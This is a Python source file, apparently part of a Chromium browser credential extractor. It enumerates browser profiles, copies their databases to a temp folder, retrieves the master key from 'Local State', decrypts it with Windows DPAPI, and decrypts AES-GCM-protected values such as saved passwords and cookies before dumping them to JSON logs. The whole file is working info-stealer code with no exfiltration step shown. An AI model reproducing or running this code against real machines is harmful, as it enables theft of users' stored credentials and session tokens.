""" IMPORTS """
# Utilities
import os
import json
from shutil import copyfile

# Cryptography
import pywintypes
from win32crypt import CryptUnprotectData
from base64 import b64decode
from Crypto.Cipher import AES


""" CONSTANTS """
# Directory paths
TEMP_PATH = 'temp'
LOGS_PATH = 'logs'

# Encryption key prefix
ENC_KEY_PREFIX = len('DPAPI')

# Encryption format: {prefix}{nonce}{encrypted_payload}{additional_data}
ENC_PREFIX_LEN = len('v10')
ENC_NONCE_LEN = 96 // 8
ENC_ADD_DATA_LEN = 128 // 8



def get_profiles(browser_path: str) -> list[str]:
    """ Returns a list of profiles for a browser """
    profiles = []
    for subdir_name in os.listdir(browser_path):
        if subdir_name == 'Default' or subdir_name.startswith('Profile'):
            profiles.append(subdir_name)
    return profiles


def create_temp_file(browser: dict, profile_name: str, db_name: str) -> str:
    """
    Creates a copy of the specified database name in a browser's profile directory
    into the TEMP directory and returns the path to this copy
    """
    original_path = f"{browser['path']}\\{profile_name}\\{db_name}"
    temp_name = f"{browser['name']} {profile_name} {db_name}"
    temp_path = f'{TEMP_PATH}\\{temp_name}'
    copyfile(original_path, temp_path)
    return temp_path


def create_log_file(data: dict or list, file_name: str) -> None:
    """ Create a log file with specified file name for some JSON-serializable data """
    log_path = f'{LOGS_PATH}\\{file_name}.json'
    with open(log_path, 'w') as f:
        json.dump(data, f, indent=4)



def get_encryption_key(browser_path: str) -> str:
    """ Retrieve the encryption / master key for AES encryption and decryption """
    # Extract the encrypted encryption key from local state
    local_state_path = browser_path + r'\Local State'
    with open(local_state_path, 'r') as f:
        encryption_key = json.load(f)['os_crypt']['encrypted_key']
    # Decode the key and remove the 'DPAPI' prefix
    encryption_key = b64decode(encryption_key)[ENC_KEY_PREFIX:]
    # Decrypt the key with Window's DPAPI
    return win_decrypt(encryption_key)


def try_decrypt(foo, encryption_key: str):
    """
    Decrypts an input foo if it is a byte-string. Whether the same type of
    data is encrypted or not varies between different Chromium browsers.
    """
    if isinstance(foo, bytes):
        try:
            # decrypts with Window's DPAPI
            return win_decrypt(foo)
        except pywintypes.error:
            # decrypts with Chromium's new standard
            return chromium_decrypt(foo, encryption_key)
    else:
        return foo


def chromium_decrypt(encrypted_str: bytes, encryption_key: str) -> str:
    """ Decrypt strings encrypted on Chromium version >= 80 """
    # Encryption format: {prefix}{nonce}{encrypted_payload}{additional_data}
    # Extract nonce and encrypted payload
    nonce = encrypted_str[ENC_PREFIX_LEN: ENC_PREFIX_LEN + ENC_NONCE_LEN]
    encrypted_payload = encrypted_str[ENC_PREFIX_LEN + ENC_NONCE_LEN: -ENC_ADD_DATA_LEN]
    # Decipher the AES-encrypted payload with encryption key and nonce
    cipher = AES.new(encryption_key, AES.MODE_GCM, nonce)
    decrypted_payload = cipher.decrypt(encrypted_payload).decode('utf-8')
    return decrypted_payload


def win_decrypt(encrypted_str: bytes) -> str:
    """ Decrypts input with Window's DPAPI """
    return CryptUnprotectData(encrypted_str, None, None, None, 0)[1] 
